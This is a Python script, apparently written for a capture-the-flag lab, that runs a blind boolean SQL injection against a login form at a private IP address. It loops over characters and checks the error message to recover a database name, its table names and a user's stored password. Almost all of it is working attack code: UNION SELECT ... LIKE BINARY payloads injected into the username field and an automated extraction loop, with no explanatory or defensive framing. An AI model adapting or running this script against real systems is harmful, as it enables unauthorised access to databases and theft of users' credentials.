import requests

# List of characters to check for
elements = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

# URL to send requests to
url = 'http://10.10.117.155/index.php'
# DB Name to retrive
db_name = []
# SQLi query payload to retrive DB name
#payload = 'kitty\' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY \''

# SQLi query payload to retrive DB tables
#payload = 'kitty\' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY \''

# SQLi query payload to retrive user password from table
payload = 'kitty\' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY \''

Flag = True

while Flag == True:
    count = 0

    for item in elements:
        # Add item in list - this will help starting with second letter in name
        db_name.append(item)
        
        print('Possible DB Element: '+str(''.join(db_name)))

        req = {'username': payload +str(''.join(db_name))+'%\' -- -', 'password': '123456'}
        query = requests.post(url, req)

        # Send request and check response based on error message
        if query.text.__contains__('Invalid username or password'):
            # Start iteration again and leave the list unchanged 
            continue
        else:
            # Remove last item added in the list in case it does not fulfill the condition after request
            del db_name[-1]
         
        count += 1
        if count == len(elements):
            Flag = False

# Print DB name
print('Found DB Element:', str(''.join(db_name)))